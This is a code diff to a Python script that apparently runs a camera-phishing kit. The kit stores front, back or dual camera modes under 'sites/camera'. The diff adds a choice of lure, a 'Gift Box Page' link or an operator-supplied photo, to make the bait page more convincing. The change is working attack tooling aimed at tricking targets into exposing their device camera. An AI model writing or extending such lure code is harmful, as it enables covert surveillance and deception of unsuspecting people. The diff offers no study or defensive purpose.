@@ -1,4 +1,4 @@
-import os, subprocess, time
+import os, subprocess, time, shutil
 
 def banner():
     os.system('clear')
@@ -22,6 +22,25 @@ def start():
     mode = "front"
     if choice == '2': mode = "back"
     elif choice == '3': mode = "dual"
+
+    # --- Naya Badlav Yahan Hai ---
+    print("\n\033[1;33m[!] Choose Link Type:\033[0m")
+    print("[01] Direct Link (Gift Box Page)")
+    print("[02] Custom Photo Link (Show your Image)")
+    link_type = input("\n\033[1;36m[+] Select: \033[0m")
+
+    if link_type == '2':
+        img_path = input("\n\033[1;32m[+] Enter Photo Path (e.g., /sdcard/image.jpg): \033[0m")
+        if os.path.exists(img_path):
+            shutil.copy(img_path, "sites/camera/custom.jpg")
+            with open("sites/camera/type.txt", "w") as f: f.write("custom")
+            print("\033[1;32m[+] Custom Photo Loaded Successfully!\033[0m")
+        else:
+            print("\033[1;31m[-] File not found! Using Direct Link instead.\033[0m")
+            with open("sites/camera/type.txt", "w") as f: f.write("direct")
+    else:
+        with open("sites/camera/type.txt", "w") as f: f.write("direct")
+    # -----------------------------
 
     if not os.path.exists("sites/camera"): os.makedirs("sites/camera")
     with open("sites/camera/mode.txt", "w") as f: f.write(mode)
@@ -49,4 +68,3 @@ def start():
 
 if __name__ == "__main__":
     start()
-    
